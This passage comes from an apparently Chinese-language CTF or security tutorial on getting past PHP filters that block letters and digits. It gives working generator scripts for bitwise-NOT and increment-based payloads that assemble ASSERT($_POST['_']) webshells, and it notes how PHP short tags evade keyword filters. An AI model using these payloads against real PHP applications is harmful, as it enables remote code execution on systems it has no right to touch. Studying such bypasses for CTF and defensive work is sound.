class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$result1</span> .= <span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符串：&quot;</span>.<span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码：&quot;</span>.<span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;解码后的结果 &quot;</span>.~(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$result1</span>));</span><br></pre></td></tr></table></figure>

<h3 id="三、无字母数字自增绕过"><a href="#三、无字母数字自增绕过" class="headerlink" title="三、无字母数字自增绕过"></a>三、无字母数字自增绕过</h3><p>原理：通过++来使字母变化(ascii码加1)，拿到字母A即可获取其他字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意加加的顺序</span></span><br><span class="line"><span class="comment">#如何获取字母A</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[];</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>; <span class="comment">#输出Array（正常情况是用print_r输出数组），但是我们无法取出A</span></span><br><span class="line">	<span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>; <span class="comment">#变成字符串</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>[<span class="number">0</span>]; <span class="comment">#可以取出A，但是不允许数字</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_</span>[<span class="variable">$__</span>];<span class="comment">#不存在的变量代替0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PHP5	ASSERT($_POST[&#x27;_&#x27;]);</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>]; <span class="comment">#拿到A(3个下划线)</span></span><br><span class="line">	<span class="variable">$__</span>=<span class="variable">$___</span>; <span class="comment">#赋值$_,$__为A</span></span><br><span class="line">	++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;...(<span class="number">18</span>次)...++<span class="variable">$__</span>; <span class="comment">#得到S</span></span><br><span class="line">	<span class="comment">#之后的内容用.拼接</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">#AS</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">#ASS</span></span><br><span class="line">	<span class="comment">#拼接完一个之后，重置$__=$___=A(三下划线一直为A)</span></span><br><span class="line">	<span class="variable">$__</span>=<span class="variable">$___</span>;</span><br><span class="line">	<span class="variable">$__</span>++; <span class="variable">$__</span>++; <span class="variable">$__</span>++;<span class="variable">$__</span>++;  </span><br><span class="line">	<span class="variable">$_</span>.<span class="variable">$__</span>;<span class="comment">#ASSE</span></span><br><span class="line">	....</span><br><span class="line">     <span class="variable">$_</span> -&gt; ASSERT;</span><br><span class="line">     <span class="variable">$____</span>(<span class="number">4</span>个) -&gt; _POST; <span class="comment">#赋初始值为_</span></span><br><span class="line">	 <span class="variable">$__</span>=<span class="variable">$$____</span>; <span class="comment">#构造$_POST</span></span><br><span class="line">	 <span class="variable">$_</span>(<span class="variable">$__</span>[_]); -&gt;<span class="title function_ invoke__">ASSERT</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>构造过程用脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="string">&#x27;ASSERT&#x27;</span>); <span class="comment">#改成你的命令,$_是cmd</span></span><br><span class="line"><span class="variable">$cmd2</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="string">&#x27;POST&#x27;</span>); <span class="comment">#改成你的命令,$____是cmd2,自己进行拼接</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$_ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">POC2</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;</span><br><span class="line">    <span class="variable">$POC_pat1</span> = <span class="string">&quot;\$__=\$___;&quot;</span>;</span><br><span class="line">    <span class="variable">$POC_pat2</span> = <span class="string">&quot;\$____ .=\$__;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$POC1</span> = <span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$str1</span>),<span class="number">16</span>,<span class="number">10</span>)-<span class="title function_ invoke__">base_convert</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;A&quot;</span>),<span class="number">16</span>,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$POC_pat3</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$POC_pat3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$str2</span> = <span class="variable">$cmd</span>[<span class="variable">$i</span>-<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$str1</span>==<span class="variable">$str2</span>)&#123;</span><br><span class="line">                <span class="variable">$POC_pat5</span> = <span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$POC_pat6</span> = <span class="variable">$POC_pat1</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;++\$__;&quot;</span>,<span class="variable">$POC1</span>).<span class="variable">$POC_pat2</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$POC_pat6</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="variable">$POC_pat7</span> = <span class="string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$POC_pat7</span>;</span><br><span class="line">    <span class="title function_ invoke__">POC</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd2</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">POC2</span>(<span class="variable">$cmd2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/15.png"></p>
<p>注意：url编码！！！</p>
<p>同理，php7构造<code>$_POST[_]</code>(反引号包围)</p>
<h3 id="无字母数字特殊符号过滤"><a href="#无字母数字特殊符号过滤" class="headerlink" title="无字母数字特殊符号过滤"></a>无字母数字特殊符号过滤</h3><h4 id="1-过滤下划线"><a href="#1-过滤下划线" class="headerlink" title="1.过滤下划线"></a>1.过滤下划线</h4><p>短标签法：&lt;?&#x3D;phpinfo();&gt;</p>
<h5 id="PHP-短标签"><a href="#PHP-短标签" class="headerlink" title="PHP 短标签"></a>PHP 短标签</h5><p>我们最常见的 PHP 标签就是<code>&lt;?php ?&gt;</code>了，但是 PHP 中还有两种短标签，即<code>&lt;? ?&gt;</code>和<code>&lt;?= ?&gt;</code>。当关键字 “php” 被过滤了之后，此时我们便不能使用<code>&lt;?php ?&gt;</code>了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号<code>;</code>。</p>
<p>其中，<code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换。而<code>&lt;?= ?&gt;</code>则是相当于<code>&lt;?php echo ... ?&gt;</code>。例如：</p>
